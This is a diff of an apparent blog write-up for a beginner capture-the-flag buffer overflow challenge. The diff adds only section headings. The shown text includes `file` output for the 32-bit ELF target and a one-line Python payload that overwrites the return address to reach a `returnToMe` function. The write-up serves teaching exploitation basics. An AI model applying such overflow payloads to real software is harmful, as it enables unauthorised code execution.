@@ -4,12 +4,16 @@ date: 06/Jan/2014
 summary: This is a buffer overflow challenge I found online. Although some people might find this to be a pretty easy exploit target, I thought of posting a writeup since it will still be someone's starting point into the jouney of exploitation.
 tags: ctf
 
+## Introduction
+
 The binary can be obtained from here: [buf0](/static/files/posts_buf0_challenge/buf0.bin). Let's see what `file` command has to tell us about this challenge file:
 
 ```
 $ file buf0.bin
 buf0.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3a0cbf6e6af7d4a5d1294f2ce18e80ad3e778d48, not stripped
 ```
+
+## Program Analysis and Testing
 
 So, this is an x86 ELF binary with symbols included. Let's run `strings` as well over this file:
 
@@ -80,5 +84,7 @@ From the IDA screenshot above it is already known that the `returnToMe` function
 $ python -c 'print "A"*54 + "\x04\x84\x04\x08"' | ./buf0.bin
 W00T!
 ```
+
+## Conclusion
 
 Awesome! We get the required string printed, thus completing this challenge. Stay tuned for a post on a similar challenge.
